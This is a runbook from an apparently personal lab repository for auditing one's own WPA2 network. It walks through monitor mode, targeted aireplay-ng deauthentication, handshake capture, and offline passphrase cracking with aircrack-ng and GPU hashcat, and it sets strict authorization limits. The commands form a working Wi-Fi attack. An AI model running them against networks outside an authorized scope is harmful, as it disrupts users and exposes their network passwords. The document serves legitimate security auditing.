# WPA2 handshake capture and audit

Capture the WPA/WPA2 four-way handshake from a network **you own or hold written authorization to
test**, then attempt to recover the passphrase offline. This is the full active-audit loop that the
passive wardriving work (Kismet surveys, [`../../knowledge/wardriving/README.md`](../../knowledge/wardriving/README.md))
deliberately stops short of. Tool setup and the one-screen version live in
[`../../software/aircrack-ng.md`](../../software/aircrack-ng.md); this runbook is the step-by-step
with expected output and the crack paths.

> **Scope — own network, or a documented written authorization, nothing else.** Deauthentication
> and handshake capture are *active* acts against a specific network. Running them against a network
> you neither own nor are authorized to test is unlawful in most jurisdictions and outside this
> repo's posture (see [`../../CLAUDE.md`](../../CLAUDE.md) and the responsible-use section of
> [`../../knowledge/README.md`](../../knowledge/README.md)). If you are not certain the target is in
> scope, it is not. Record the authorization (own gear, or the engagement's scope and date) in your
> session notes before you start.

**Goal:** a saved capture containing a valid WPA2 four-way handshake (or PMKID) for an in-scope
network, and a pass/fail on recovering its PSK from a wordlist.

## Prerequisites

- [ ] **Authorization confirmed and noted** — own network, or written scope. Nothing below runs
      until this is true.
- [ ] Monitor-capable adapter present. On this build that is `wlan1`, the **AC1200** (MediaTek
      MT7921AUN, `mt7921u`) — arrived and verified 2026-09-30, monitor mode on 2.4/5/6 GHz. It is on
      the AIO V2's internal USB-C port, so its USB rail must be on (`aiov2_ctl USB on`). The onboard
      `wlan0` (`brcmfmac`) has **no** monitor mode. Confirm with `sudo airmon-ng`. (The RT5370 was
      the 2.4-only stand-in before the AC1200; removed.)
- [ ] `aircrack-ng` installed (verified on this hardware 2026-09-21, v1.7 — see
      [`../../software/aircrack-ng.md`](../../software/aircrack-ng.md)).
- [ ] A **wordlist** you control, on storage with room. `aircrack-ng` can only test candidates you
      give it — it does not brute-force the keyspace in any useful time (see *Realistic
      expectations*).
- [ ] A working directory **outside this repo**, e.g. `~/labs/wpa/`. Captures and recovered PSKs
      never belong in the repo tree; `.gitignore` excludes `*.cap`/`*.pcap`/`*.pcapng`/`*.hccapx`/
      `*.hc22000` only as a backstop.
- [ ] Interference minimised: nothing else should be driving `wlan1`. Do **not** blanket-run
      `airmon-ng check kill` on this build — it stops `NetworkManager`/`wpa_supplicant` that Kismet,
      `aiov2_ctl` rails and Tailscale depend on. Kill only what actually contends for `wlan1`.

```bash
mkdir -p ~/labs/wpa && cd ~/labs/wpa
export LANG=C.UTF-8   # Fancy's default locale is empty; silences airodump-ng's non-UNICODE warning
```

## 1. Interface into monitor mode

```bash
sudo airmon-ng                 # confirm wlan1 / AC1200 (mt7921u) is listed as monitor-capable
sudo airmon-ng start wlan1     # wlan1 -> wlan1mon
iw dev                         # confirm wlan1mon exists, type monitor
```

**Pass:** `wlan1mon` appears, `type monitor`. If `airmon-ng` warns about interfering processes,
note them but only kill the one holding `wlan1` (usually `wpa_supplicant`), not the whole list.

## 2. Find the target

Survey to get the exact **BSSID** and **channel** — you need both to lock the capture.

```bash
sudo airodump-ng wlan1mon      # band sweep; add --band abg for 2.4+5 GHz; Ctrl-C on the row you want
```

Read off your in-scope AP's `BSSID`, `CH`, and `ENC` (should be `WPA2`). Note whether any
`STATION` rows are associated to it — a connected client is what makes a handshake capturable.

- [ ] BSSID recorded: `__:__:__:__:__:__`
- [ ] Channel recorded: `__`
- [ ] At least one associated station seen (needed for the deauth path in step 3b)

> The AC1200 covers 2.4, 5 and 6 GHz, so a 5 GHz AP you own can be captured too. `airodump-ng`
> sweeps the band(s) the adapter is tuned to — use `--band a` (5 GHz) or `--band abg` (both), and
> lock to the AP's channel at capture time.

## 3. Capture the handshake

### 3a. Lock the capture

In one shell, pin `airodump-ng` to the target's channel and BSSID and write to a file prefix:

```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w handshake wlan1mon
```

Leave this running. When a client completes association, `airodump-ng` prints
`WPA handshake: <BSSID>` in the top-right of the header. That is the signal you have what you came
for. Files `handshake-01.cap` (and `.csv`, `.kismet.*`) accumulate in the working dir.

### 3b. Force a handshake (optional, authorization-gated)

If no client re-authenticates on its own and you are authorized to deauth, nudge one client so it
reconnects and you catch the handshake. **Deauth a client you own; do not broadcast-deauth a shared
network.** In a *second* shell, keeping 3a running:

```bash
# targeted: -c is the CLIENT's MAC (from the STATION column), -a is the AP BSSID
sudo aireplay-ng --deauth 3 -a <BSSID> -c <CLIENT-MAC> wlan1mon
```

Send a few, not a flood — three is usually enough. Watch the 3a shell for
`WPA handshake: <BSSID>`. Repeat once if it doesn't land. Broadcast deauth (omitting `-c`) hits
every client and is disruptive; only appropriate on a network you own and have cleared to disrupt.

> **802.11w / PMF.** If the target AP has Protected Management Frames enabled — increasingly the
> default, and mandatory under WPA3 — the client rejects forged deauths and this step does nothing.
> Fall back to waiting for a natural client join, or to the clientless PMKID path (`hcxdumptool`,
> not installed here). A WPA3/SAE association won't yield a crackable handshake at all.

## 4. Confirm you actually captured it

A `.cap` without a complete four-way handshake will silently fail to crack. Verify before you tear
down the radio, while you can still re-capture:

```bash
aircrack-ng handshake-01.cap    # lists networks; the target should say "1 handshake"
```

**Pass:** the target BSSID row shows a handshake. If it doesn't, return to step 3 (the client may
have only sent a partial exchange). `.cap` files can be merged if you captured across several:
`mergecap -w merged.cap handshake-*.cap` (from `wireshark-common`, *not installed by default —
verify before relying on it*).

## 5. Recover the PSK (offline)

**Fancy captures; a beefier box cracks.** The CM4 is CPU-only and slow (see *Realistic
expectations*), so treat on-device cracking as a quick sanity check and offload any real run to a
GPU host on the tailnet — `gpu-host` or `homeserver`. The handshake is small; the transfer is
trivial.

### 5a. On-device quick check — aircrack-ng (verified path on this build)

Worth a moment only against a **short, targeted** list (e.g. you think you know the PSK, or a
handful of candidates):

```bash
aircrack-ng -w /path/to/small-wordlist.txt -b <BSSID> handshake-01.cap
```

`aircrack-ng` tests each line as the PSK against the captured handshake. **Pass:**
`KEY FOUND! [ passphrase ]`. **Fail / not in a short list:** stop here and move to 5b rather than
grinding a big wordlist on the CM4.

### 5b. Offload to a GPU host over the tailnet (the real crack path)

Transfer the capture to a beefier tailnet host and run hashcat there, where a GPU makes a large
wordlist practical. `hcxtools`/`hashcat` are **not installed on Fancy** — do the conversion and the
crack on the target host, not here.

```bash
# from Fancy: send the raw capture over the tailnet (pick your host)
scp handshake-01.cap user@gpu-host:~/wpa/      # or: ...@homeserver:~/wpa/
```

Then on that host (commands are for the host, *unverified from here* — adjust to its OS/paths):

```bash
hcxpcapngtool -o handshake.hc22000 handshake-01.cap        # from hcxtools
hashcat -m 22000 handshake.hc22000 /path/to/wordlist.txt   # GPU-backed; -m 22000 = WPA-PBKDF2/PMKID+EAPOL
```

> `gpu-host` is a Windows tailnet host with an NVIDIA GPU; its **Kali WSL joins the tailnet as
> its own node `gpu-host-wsl`** and is where the crack runs. See
> [`../reference/gpu-crack-offload-host.md`](../reference/gpu-crack-offload-host.md) for the full
> one-time setup (systemd + kernel-mode tailscaled, the `accept` SSH ACL, and CUDA-in-WSL).

Same outcome shape either way: the PSK is found only if it's in the wordlist.

**Automated.** [`software/crack-offload.sh`](../../software/crack-offload.sh) does all of the above —
checks the host is reachable, ensures the wordlist exists (expanding `rockyou.txt.gz` if needed),
copies the capture, converts, and runs `hashcat -m 22000 -O -w 3`:

```bash
CRACK_HOST=gpu-host-wsl ~/labs/wpa/crack-offload.sh ~/labs/wpa/handshake-01.cap
```

Validated 2026-09-26 on `gpu-host-wsl` (RTX 3070 Ti): full `rockyou` in ~46 s vs ~14 min
CPU-only on Fancy.

## Realistic expectations

- **On Fancy:** a **CPU-only, wordlist** attack on a low-power ARM SoC — roughly a few hundred to
  low-thousands of WPA candidates/second (*unverified on this device; measure with `aircrack-ng -S`
  or a timed run*). WPA2's PBKDF2-SHA1 (4096 iterations) is deliberately slow. Fine for confirming a
  known/weak PSK, useless for exhausting a strong random passphrase. That's why 5b exists.
- **On a GPU host:** orders of magnitude faster, but still a *wordlist/rules* attack — it does not
  brute-force a strong random passphrase in useful time either.
- WPA3 / SAE (and WPA2 transition mode negotiated as SAE) does **not** yield a crackable four-way
  handshake this way — capturing one tells you the network is WPA2-PSK.
- The whole exercise proves a PSK is weak (or confirms it's strong). It is an audit, not a
  guarantee of access.

## Teardown

```bash
sudo airmon-ng stop wlan1mon    # wlan1mon -> wlan1, managed mode
iw dev                          # confirm wlan1 is back, type managed
sudo systemctl restart NetworkManager   # only if you killed it in step 1
```

- [ ] `wlan1` restored to managed mode
- [ ] Normal Wi-Fi / Kismet operation confirmed if you need it back

## Data handling

Move every capture and any recovered PSK **off the device** to storage you control. They contain
the target network's real frames and, on success, its actual password.

```bash
# example: copy to a controlled tailnet host, then remove local copies
rsync -a ~/labs/wpa/ user@homeserver:~/engagements/<name>/wpa/ && rm -f ~/labs/wpa/handshake-*
```

Never commit them. If you took any notes worth keeping, a **finding** under
[`../../knowledge/wardriving/findings/`](../../knowledge/wardriving/findings/) records the *result*
(e.g. "own AP PSK recovered from rockyou in N min — rotate it") without the capture file or the
cleartext PSK.

## References

- `aircrack-ng` suite docs — https://www.aircrack-ng.org/doku.php (version-dependent; commands here
  match v1.7)
- hcxtools — https://github.com/ZerBea/hcxtools
- hashcat mode 22000 (WPA-PBKDF2-PMKID+EAPOL) — https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
- Tool setup on this build: [`../../software/aircrack-ng.md`](../../software/aircrack-ng.md)
- Passive counterpart: [`../../knowledge/wardriving/README.md`](../../knowledge/wardriving/README.md)
